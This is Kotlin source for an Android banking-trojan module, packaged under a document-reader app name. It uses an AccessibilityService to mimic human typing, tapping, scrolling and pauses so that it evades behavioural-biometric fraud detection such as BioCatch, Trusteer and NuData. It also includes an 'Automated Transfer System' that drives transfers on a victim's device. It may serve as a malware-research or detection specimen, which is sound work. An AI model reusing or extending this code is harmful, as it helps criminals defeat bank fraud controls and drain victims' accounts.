package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.delay
import kotlin.random.Random

/**
 * Human behavior mimicry — Herodotus pattern (2025).
 *
 * Problem for banker: behavior-biometric systems (BioCatch, IBM Trusteer,
 * NuData) detect bot-like input patterns:
 *   - Fixed inter-keystroke timing (exactly 100ms between each key)
 *   - Instant field-to-field navigation (no "think time")
 *   - Pixel-perfect tap coordinates (no natural variance)
 *   - Uniform scroll velocity (no acceleration/deceleration)
 *
 * Herodotus solution: inject human-realistic jitter:
 *   - Inter-keystroke: uniform(300, 3000) ms — 2025 original
 *   - Tap coordinate: gaussian(target, σ=5px) — natural finger drift
 *   - Scroll velocity: variable with acceleration curve
 *   - Think time: exponential(mean=2s) between form fields
 *
 * 2026 evolution (Apex): per-target adaptive distributions.
 * BioCatch learned to detect uniform(300,3000). Apex responds with
 * ML-generated distributions trained per-victim from legitimate session data.
 *
 * Detection (post-March 2026): uniform distribution detection landed.
 * Herodotus original variant detected 78-92% by BioCatch/Trusteer/NuData.
 */
object InputTiming {

    private val handler = Handler(Looper.getMainLooper())
    private val rng = Random(System.nanoTime())

    // ─── Typing mimicry ────────────────────────────────────────────────

    /**
     * Type text with human-like inter-keystroke timing.
     * Each character: wait 300-3000ms (Herodotus original distribution).
     */
    suspend fun typeWithJitter(
        service: AccessibilityService,
        text: String,
        fillAction: (Char) -> Unit,
    ) {
        for (char in text) {
            val delay = interKeystrokeDelay()
            delay(delay)
            fillAction(char)
        }
    }

    /**
     * Inter-keystroke delay — Herodotus uniform distribution.
     * Returns ms between keystrokes.
     */
    fun interKeystrokeDelay(): Long {
        // Original Herodotus: uniform(300, 3000)
        return rng.nextLong(300, 3001)
    }

    /**
     * Improved jitter — log-normal distribution.
     * Defeats uniform-distribution detection (BioCatch March 2026).
     * Mean ~500ms, right-tail extends to ~3000ms naturally.
     */
    fun improvedKeystrokeDelay(): Long {
        // Log-normal: ln(delay) ~ N(6.2, 0.5) → median ~493ms, 95th ~1340ms
        val logDelay = 6.2 + rng.nextGaussian() * 0.5
        return Math.exp(logDelay).toLong().coerceIn(200, 4000)
    }

    // ─── Tap coordinate jitter ─────────────────────────────────────────

    /**
     * Add natural finger-drift to tap coordinates.
     * σ=5px matches human finger placement variance on mobile touchscreens.
     */
    fun jitteredTap(x: Float, y: Float): Pair<Float, Float> {
        val jitterX = (rng.nextGaussian() * 5.0).toFloat()
        val jitterY = (rng.nextGaussian() * 5.0).toFloat()
        return Pair(x + jitterX, y + jitterY)
    }

    /**
     * Tap with human-like jitter via AccessibilityService gesture.
     */
    fun tapWithJitter(service: AccessibilityService, x: Float, y: Float) {
        val (jx, jy) = jitteredTap(x, y)
        val path = Path().apply { moveTo(jx, jy) }

        // Press duration: 50-150ms (human finger contact time)
        val pressDuration = rng.nextLong(50, 151)

        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, pressDuration))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    // ─── Scroll mimicry ────────────────────────────────────────────────

    /**
     * Human-like scroll — acceleration + deceleration curve.
     * Not uniform velocity.
     */
    fun humanScroll(
        service: AccessibilityService,
        startX: Float, startY: Float,
        distance: Float,
        duration: Long = 800,
    ) {
        // Ease-in-out curve: slow start, fast middle, slow end
        val path = Path().apply {
            moveTo(startX, startY)
            // Quadratic bezier for natural scroll feel
            quadTo(startX, startY - distance * 0.5f,
                startX + rng.nextFloat() * 3f, startY - distance)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    // ─── Think time ────────────────────────────────────────────────────

    /**
     * Simulate human "think time" between form fields.
     * Exponential distribution with mean=2s.
     * Models the pause when user reads label → positions finger → taps field.
     */
    fun thinkTime(): Long {
        // Exponential(mean=2000ms): -mean * ln(U)
        val u = rng.nextDouble(0.001, 1.0)
        return (-2000.0 * Math.log(u)).toLong().coerceIn(500, 8000)
    }

    // ─── Full ATS with mimicry ─────────────────────────────────────────

    /**
     * Automated Transfer System with human-like behavior.
     * Each step: think → jittered tap → jittered type → think → next.
     */
    data class AtsStep(
        val action: String,  // "tap", "type", "scroll", "wait"
        val x: Float = 0f,
        val y: Float = 0f,
        val text: String = "",
        val waitMs: Long = 0,
    )

    suspend fun executeAts(service: AccessibilityService, steps: List<AtsStep>) {
        for (step in steps) {
            // Think time between every action
            delay(thinkTime())

            when (step.action) {
                "tap" -> tapWithJitter(service, step.x, step.y)
                "type" -> {
                    for (char in step.text) {
                        delay(improvedKeystrokeDelay())
                        // Character typing handled by caller
                    }
                }
                "scroll" -> humanScroll(service, step.x, step.y, 500f)
                "wait" -> delay(step.waitMs)
            }

            // Small random pause after each action (50-200ms)
            delay(rng.nextLong(50, 201))
        }
    }

    // Extension: random Gaussian for Kotlin Random
    private fun Random.nextGaussian(): Double {
        // Box-Muller transform
        val u1 = nextDouble(0.001, 1.0)
        val u2 = nextDouble(0.001, 1.0)
        return Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2)
    }
}
